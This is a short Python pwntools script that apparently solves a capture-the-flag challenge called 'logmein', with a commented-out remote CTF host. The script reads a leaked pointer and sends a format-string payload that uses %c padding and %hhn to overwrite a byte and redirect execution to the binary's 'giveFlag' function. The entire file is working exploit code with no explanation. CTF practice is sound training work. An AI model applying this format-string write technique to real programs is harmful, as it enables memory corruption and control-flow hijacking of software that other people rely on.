from pwn import *
import struct
#io = remote("ctf.hackucf.org", 7006)

exe = context.binary = ELF('logmein')

io = exe.process()
io.recvuntil("user = ")
ptr = io.recvline().strip()
print(ptr)
ptr = int(ptr, base=16)
print(ptr)
winaddr = exe.symbols['giveFlag']
val = (winaddr & 0xff)
payload = b"A" * 20
payload += p64(ptr)
payload += b"%%%dc" % val
payload += b"%hhn"
print(payload)
io.sendline(payload)
io.interactive()
